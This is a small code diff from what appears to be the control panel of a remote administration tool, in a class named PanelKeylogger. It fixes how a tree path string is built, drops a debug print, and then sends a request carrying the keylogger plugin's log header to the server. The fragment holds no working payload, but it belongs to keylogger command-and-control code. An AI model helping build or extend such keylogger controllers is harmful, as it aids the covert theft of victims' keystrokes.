@@ -122,13 +122,11 @@ public class PanelKeylogger extends BaseControlPanel {
 					for (int i = 1; i < event.getPath().getPath().length; i++) {
 						DefaultMutableTreeNode tp = (DefaultMutableTreeNode)event.getPath().getPath()[i];
 						
-						path += tp.toString() + "/";
+						path += "/" + tp.toString();
 					}
 					
 					final String finalPath = path;
-					
-					System.out.println(path);
-					
+										
 					try {
 						getServer().addToSendQueue(new PacketBuilder(KeyloggerPlugin.LOG_HEADER, getServer()) {
 							@Override
